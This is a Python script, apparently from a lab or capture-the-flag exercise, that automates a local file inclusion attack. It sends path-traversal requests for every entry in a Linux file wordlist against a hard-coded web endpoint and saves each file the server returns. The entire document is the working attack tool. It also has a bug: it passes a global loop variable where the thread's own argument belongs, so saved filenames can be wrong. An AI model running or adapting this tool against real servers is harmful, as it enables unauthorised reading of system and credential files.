#!/usr/bin/env python3

# This script use to help for lfi exploit.
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED
import requests
import sys,os

wordlist_location = "./lfi-linux-full.txt"
save_dir = "output/"
thread_num = 10
url = "http://10.129.96.46/file_management/?file=../../../../../../../.."

def savefile(data,aline):
    print("\nReceived: " + aline)
    savefile = save_dir + str(os.path.abspath(aline)).replace("/","_").replace("\\","_")
    file = open(savefile,"w",encoding='utf-8')
    file.writelines(data)
    file.close()

executor = ThreadPoolExecutor(max_workers=thread_num)
     
def sub_thread(wordlist):
    try:
        # How to send request ? 
        print(".",end='')
        return_str = requests.get(url + wordlist).text

        # When to save file?
        if return_str.find("Internal Server Error") == -1 :
            savefile(return_str,line)
        # Done
    except:
        pass

    
# Load in to thread
tasks = []
with open(wordlist_location,'r', encoding='utf-8') as wordlists:
    for line in wordlists:
        tasks.append(executor.submit(sub_thread, (line)))

wait(tasks, return_when=ALL_COMPLETED)

